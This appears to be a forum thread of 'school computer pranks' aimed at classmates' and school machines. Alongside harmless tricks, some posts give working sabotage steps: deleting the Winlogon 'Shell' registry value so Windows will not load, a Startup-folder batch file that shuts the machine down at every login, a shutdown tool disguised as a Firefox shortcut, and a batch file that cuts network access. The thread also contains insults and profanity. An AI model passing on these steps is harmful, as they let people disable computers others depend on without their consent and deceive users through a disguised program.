channel.title: School computer pranks!
channel.description:
[u][b][glow=red,2,300]firstly is that this is your choice i didnt not force you to do anything. so do not blame me if u get beatin up or go in trouble[/glow][/b][/u] ok
1. when you victim/friend has leaft the computer. take a print screen of your victims desktop and then paste it into print and save as. delete all the icons off the desktop and then start>control panel>printers and other hardware>mouse>pointers and and double click normal select and browse for the loading pointer. and press apply. then hide the start toolbar and wait for him to come back. laugh your @$$ off cuz ur victim is siting there waiting for it to load. :P
2.open not pad and conitunously prss ctrl+n. and sit back and watch your friend try to exit all of them. ;D
3.When someone leaves their computer, go into microsoft word and make an auto correct option to change the word *the* into the word poo or sumthing like that. ;)
3.First go to google and search windows shutdown utility. DL it. put a shortcut on the desktop and change the icon to the firefox icon and rename the name to firefox or wateva. and next wen they go on there comp. watch them constenly turn off there comp and they dont know y. :D :D

ur a fucking idiot…everyone knows how to do that

item.dc:creator: @gokon gokon
item.description:
@gokon wrote:

Throatcut:

Hit F11 then hold Print Screen + Alt+ Shift then Windows + E = lawl

first time i tried it i got into the my computer window… second time when i decided to try pressing em all at once, my computer started beeping at me… lol. the third time it did the dnk noise that comes from the speakers when you press a key but it cant do anything.

ps, yes i do realize that the beeping just means im pressing too many keys at once.

item.title: School computer pranks!
item.dc:creator: @bowserjr2 Bowser jr
item.description:
@bowserjr2 wrote:

To extra effekt do that Prnt Screen trick.
And be sure the button line with start is there.
Lets that be that background.

Go to start-“that thing under search”-REGEDIT.

then

HKEY_LOCAL_MACHINE
SOFTWARE
Microsoft
Windows NT
Curentversion
Winlogon

And Delete The value with name Shell.
If you Reboot the Explorer Don’t start and People who try to use windows get big Problem.

To fix the problem create A string in the same map so Shell was in.
Name it Shell and Value Explorer.exe

Read full topic

@gho5t wrote:

K i dont know if this has been posted but on some computers if you hit ctrl+alt+up arrow, it turns the screen upside-down. And if you hit the left button it turns to the left and right arrow makes it go to the right. To make it normal hit ctrl+alt+down.

item.title: School computer pranks!
item.dc:creator: @Gotta_Catch_Them_All Gotta Catch Them All
item.description:
@Gotta_Catch_Them_All wrote:

You can scare the shit out of my ICT teacher by doing just about anything on a computer. He says “Ok Matthew, copy this into My Documents.” So I press Ctrl + C and he raises his voice and goes “Noo, what are you doing? I said copy, go to edit > copy.”
Then he got an even bigger boner when I hit Ctrl + V to paste whatever it was into My Documents. Lol my ICT teacher is an idiot.

Read full topic

item.title: School computer pranks!
item.dc:creator: @Original_Daniel Original Daniel
item.description:
@Original_Daniel wrote:

Make 2 batch files

copy down.bat “C:\Documents and Settings\All Users\Start Menu\Programs\Startup”

and

C:\WINDOWS\SYSTEM32\TSSHUTDN.EXE 0 /DELAY:0 /POWERDOWN (name it as down.bat)

Run the first 1 and whenever you turn on the computer, after logging in it will shut down.
(Though you can quickly close the batch file upon startup to get out of it, you can write a simple program to open the batch file over and over again until the computer does shut down.)

Read full topic

item.description:
@killa wrote:

i got 1 for you
stop em goin on the net:
open notepad type in
ipconfig /release
save as n.bat
doubl click no net then delete it
then to reverse it type
ipconfig /renew
happy pranking
